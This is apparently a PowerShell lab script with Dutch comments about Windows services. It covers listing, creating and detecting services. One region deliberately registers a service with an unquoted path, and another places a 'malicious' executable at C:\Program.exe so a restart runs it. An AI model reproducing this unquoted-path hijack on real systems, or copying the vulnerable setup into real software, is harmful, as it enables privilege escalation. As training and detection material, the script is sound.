#region service-inventory
# Toon alle Windows-services
Get-Service

# Filter op actief draaiende services
Get-Service | Where-Object Status -EQ "Running"

# Filter op services die momenteel niet draaien
Get-Service | Where-Object Status -NE "Running"

# Inspecteer een specifieke service op basis van de interne servicenaam
Get-Service -Name MyService

# Toon alle eigenschappen van alle services in tabelformaat
Get-Service | select -Property * | FT
#endregion service-inventory

#region service-unquoted-path
# Moderne vervanger van WMIC om ongequote servicepaden op te sporen
Get-CimInstance Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notlike 'C:\Windows\*' -and $_.PathName -notlike '"*"*' } | Select-Object Name, StartMode, PathName
#endregion service-unquoted-path

#region service-lifecycle
# Registreer een nieuwe service (PowerShell plaatst de aanhalingstekens niet in het register)
New-Service -Name MyService -BinaryPathName "C:\Program Files\my service\WindowsService1.exe"

# Start, stop en controleer de service
Start-Service -Name MyService
Stop-Service -Name MyService
Get-Service -Name MyService
#endregion service-lifecycle

#region service-eventviewer
# Open de Event Viewer rechtstreeks vanuit PowerShell of CMD
eventvwr.msc
#endregion service-eventviewer

#region service-lab-setup
# Maak de map met spaties aan en kopieer de service-executable erheen
mkdir "C:\Program Files\my service"
copy C:\Users\cybrary\Desktop\WindowsService1.exe "C:\Program Files\my service"
# Registreer de service zonder aanhalingstekens in het pad (kwetsbaar) en start hem
New-Service -Name MyService -BinaryPathName "C:\Program Files\my service\WindowsService1.exe"
Start-Service -Name MyService
#endregion service-lab-setup

#region service-lab-hijack
# Plaats een kwaadaardige executable op C:\Program.exe, waar Windows als eerste zoekt
copy C:\Users\cybrary\Desktop\EvilWindowsService.exe C:\Program.exe
# Herstart de service: Windows start nu C:\Program.exe in plaats van de echte service
Stop-Service -Name MyService
Start-Service -Name MyService
#endregion service-lab-hijack

#region service-auto-not-running
# Services met opstarttype Automatic die niet draaien: mogelijk gecrasht of gestopt door een aanvaller
Get-Service | Where-Object { $_.StartType -eq "Automatic" -and $_.Status -ne "Running" }
#endregion service-auto-not-running
